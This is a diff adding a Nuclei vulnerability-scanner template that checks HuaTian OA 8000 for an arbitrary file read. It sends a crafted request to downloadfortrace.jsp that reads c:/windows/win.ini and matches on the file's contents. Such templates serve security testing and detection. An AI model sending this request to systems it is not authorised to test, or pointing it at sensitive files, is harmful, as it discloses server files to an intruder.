@@ -1,0 +1,28 @@
+id: HuaTianOA8000-downloadfortrace-ReadAnyFile
+
+info:
+  name: HuaTianOA8000-downloadfortrace-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    HuaTianOA8000-downloadfortrace-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        GET /OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 16-bit
+          - "[fonts]"
+        condition: and
+
+      - type: status
+        status:
+          - 200
